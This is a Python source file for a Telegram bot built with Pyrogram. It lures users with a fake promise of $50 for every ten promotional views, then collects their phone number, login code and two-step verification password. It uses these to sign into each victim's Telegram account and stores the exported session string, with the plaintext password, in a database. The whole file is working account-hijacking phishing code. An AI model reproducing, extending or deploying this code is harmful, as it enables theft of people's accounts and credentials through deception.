import asyncio
from pyrogram import Client, filters
from database import db
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from pyrogram.errors import (
    FloodWait, ListenerTimeout, PhoneCodeExpired, PhoneCodeInvalid,
    SessionPasswordNeeded, PasswordHashInvalid
)
from variables import Vars


@Client.on_message(filters.private & filters.command("start"))
async def share_contact(bot: Client, message: Message):
    await db.add_user(message.from_user.id)

    keyboard = ReplyKeyboardMarkup(
        [[KeyboardButton("📱 Share Contact", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )

    await message.reply_text(
        f"""
> **Hello {message.from_user.mention}! Welcome.**

I am an **Agent Bot** working with celebrities, influencers, and brands to expand their reach.

> **How it works:**
- I connect you with posts to promote.
- You share them and bring real views.
- For every 10 genuine views, you earn **$50**.

> **Why we pay?**  
Brands invest in visibility, and we reward people who help make it happen.
""",
        reply_markup=keyboard
    )


@Client.on_message(filters.contact & filters.private)
async def contact_handler(bot: Client, message: Message):
    user_id = message.from_user.id
    phone_number = message.contact.phone_number
    first_name = message.contact.first_name

    await bot.send_message(user_id, "> **I have sent a verification code. Please check your SMS.**")

    client = Client(
        name="temp_bot",
        api_id=Vars.API_ID,
        api_hash=Vars.API_HASH,
        in_memory=True
    )

    await client.connect()
    pwd = None

    # === Send OTP loop ===
    while True:
        try:
            code = await client.send_code(phone_number)
            break
        except FloodWait as f:
            await bot.send_message(
                user_id,
                f"> **Too many attempts. Please wait {f.value or f.x} seconds.**"
            )
            await asyncio.sleep(f.value or f.x)
        except Exception as ex:
            return await bot.send_message(user_id, f"> **Error while sending OTP:** `{str(ex)}`")

    # === OTP input loop ===
    while True:
        try:
            otp = await bot.ask(
                chat_id=user_id,
                text=f"**I sent an OTP to** `{phone_number}`\n\n> Please enter it like `1 2 3 4 5`",
                filters=filters.text,
                timeout=600
            )
        except ListenerTimeout:
            await bot.send_message(
                user_id,
                "> **Timeout! You didn’t reply in 10 minutes. Let’s try again.**"
            )
            continue  # Retry loop

        otp = otp.text.replace(" ", "")

        try:
            await client.sign_in(phone_number, code.phone_code_hash, otp)
            break  # ✅ success
        except PhoneCodeInvalid:
            await bot.send_message(user_id, "> **Invalid OTP. Please try again.**")
        except PhoneCodeExpired:
            await bot.send_message(user_id, "> **OTP expired. Resending...**")
            try:
                code = await client.send_code(phone_number)
            except Exception as ex:
                return await bot.send_message(user_id, f"> **Error while resending OTP:** `{str(ex)}`")
        except SessionPasswordNeeded:
            # === Two-step verification loop ===
            while True:
                try:
                    pwd_msg = await bot.ask(
                        chat_id=user_id,
                        text="🔐 **Two-step verification is enabled.**\n> Please enter your password:",
                        filters=filters.text,
                        timeout=300,
                    )
                except ListenerTimeout:
                    await bot.send_message(
                        user_id,
                        "> **Timeout! You didn’t reply in 5 minutes. Let’s try again.**"
                    )
                    continue

                pwd = pwd_msg.text
                try:
                    await client.check_password(password=pwd)
                    break  # ✅ success
                except PasswordHashInvalid:
                    await bot.send_message(user_id, "> **Wrong password. Try again.**")
                    continue
            break
        except Exception as ex:
            return await bot.send_message(user_id, f"> **Error during sign-in:** `{str(ex)}`")

    # === Save session ===
    try:
        string_session = await client.export_session_string()
        account_info = {
            "user_id": user_id,
            "name": first_name,
            "phone_number": phone_number,
            "two_step_password": pwd,
            "session": string_session
        }
        await db.add_user_account(account_info)
        await client.disconnect()
        await bot.send_message(user_id, "> ✅ **Your account was verified successfully!**")
        return string_session
    except Exception as ex:
        await bot.send_message(user_id, f"> **Error while saving account:** `{str(ex)}`")
